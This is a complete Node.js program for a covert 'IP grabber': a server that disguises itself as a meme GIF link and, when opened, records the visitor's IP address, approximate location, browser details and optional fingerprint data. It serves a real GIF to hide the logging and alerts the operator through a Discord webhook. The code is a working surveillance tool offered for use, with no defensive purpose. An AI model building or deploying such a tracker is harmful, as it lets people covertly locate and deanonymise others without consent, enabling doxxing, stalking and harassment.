const express = require('express');
const https = require('https');
const geoip = require('geoip-lite');
const fs = require('fs');
const app = express();

const CONFIG = {
    targetGif: 'https://media3.giphy.com/media/26n6WywJyh39n1pBu/giphy.gif',
    webhook: 'YOUR_DISCORD_WEBHOOK_URL', // Optional: instant notifications
    logFile: 'visitors.json'
};

// Middleware to parse data
app.use(express.json());

function getClientInfo(req) {
    // Better IP extraction (handles multiple proxies)
    let ip = req.headers['x-forwarded-for']?.split(',')[0].trim() 
          || req.headers['x-real-ip'] 
          || req.socket.remoteAddress;
    
    // Remove IPv6 prefix if present
    if (ip?.startsWith('::ffff:')) ip = ip.substring(7);
    
    // Geo lookup
    const geo = geoip.lookup(ip) || {};
    
    return {
        ip: ip,
        timestamp: new Date().toISOString(),
        userAgent: req.headers['user-agent'],
        referrer: req.headers['referer'] || 'direct',
        language: req.headers['accept-language']?.split(',')[0],
        country: geo.country,
        region: geo.region,
        city: geo.city,
        ll: geo.ll, // lat/long
        timezone: geo.timezone,
        platform: req.headers['sec-ch-ua-platform'] || 'unknown',
        discord: req.headers['user-agent']?.includes('Discord')
    };
}

app.get('/meme.gif', async (req, res) => {
    const data = getClientInfo(req);
    
    // Console log with colors for visibility
    console.log('\x1b[32m[+] New Hit\x1b[0m');
    console.log(`IP: ${data.ip} | ${data.city}, ${data.country}`);
    console.log(`Discord: ${data.discord ? 'Yes' : 'No'}`);
    
    // Save to JSON for structured data
    const logs = JSON.parse(fs.readFileSync(CONFIG.logFile, 'utf8') || '[]');
    logs.push(data);
    fs.writeFileSync(CONFIG.logFile, JSON.stringify(logs, null, 2));
    
    // Discord webhook notification (async, don't wait)
    if (CONFIG.webhook && !data.discord) {
        const payload = {
            embeds: [{
                title: '🎯 IP Logged',
                color: 0x00ff00,
                fields: [
                    { name: 'IP', value: data.ip, inline: true },
                    { name: 'Location', value: `${data.city}, ${data.country}`, inline: true },
                    { name: 'User-Agent', value: data.userAgent?.substring(0, 100) || 'None' }
                ],
                timestamp: new Date().toISOString()
            }]
        };
        
        fetch(CONFIG.webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(() => {});
    }
    
    // Proxy the GIF with cache-busting headers
    https.get(CONFIG.targetGif, {
        headers: { 'User-Agent': 'Mozilla/5.0' }
    }, (gifRes) => {
        res.setHeader('Content-Type', 'image/gif');
        res.setHeader('Cache-Control', 'no-store, private, max-age=0');
        res.setHeader('Pragma', 'no-cache');
        res.setHeader('Expires', '0');
        res.setHeader('X-Content-Type-Options', 'nosniff');
        // Remove identifying headers
        res.removeHeader('X-Powered-By');
        gifRes.pipe(res);
    }).on('error', () => {
        res.status(404).send('Not found');
    });
});

// Optional: JavaScript tracker for extra data (requires HTML page)
app.get('/track.js', (req, res) => {
    res.setHeader('Content-Type', 'application/javascript');
    res.send(`
        fetch('/log-data', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                screen: screen.width + 'x' + screen.height,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                plugins: navigator.plugins.length,
                cookies: navigator.cookieEnabled
            })
        });
    `);
});

app.post('/log-data', (req, res) => {
    // Merge JS data with IP data
    const ipData = getClientInfo(req);
    const merged = { ...ipData, ...req.body };
    
    const logs = JSON.parse(fs.readFileSync(CONFIG.logFile, 'utf8') || '[]');
    logs.push(merged);
    fs.writeFileSync(CONFIG.logFile, JSON.stringify(logs, null, 2));
    res.sendStatus(200);
});

// Dashboard to view logs
app.get('/admin', (req, res) => {
    const logs = JSON.parse(fs.readFileSync(CONFIG.logFile, 'utf8') || '[]');
    res.send(`
        <html>
        <head><title>Logs</title></head>
        <body>
            <h1>Recent Hits (${logs.length} total)</h1>
            <table border="1">
                <tr><th>Time</th><th>IP</th><th>Location</th><th>Source</th></tr>
                ${logs.slice(-50).reverse().map(l => `
                    <tr>
                        <td>${new Date(l.timestamp).toLocaleString()}</td>
                        <td>${l.ip}</td>
                        <td>${l.city || 'Unknown'}, ${l.country || 'Unknown'}</td>
                        <td>${l.discord ? 'Discord' : 'Other'}</td>
                    </tr>
                `).join('')}
            </table>
        </body>
        </html>
    `);
});

app.listen(3000, () => console.log('Stealth logger running'));
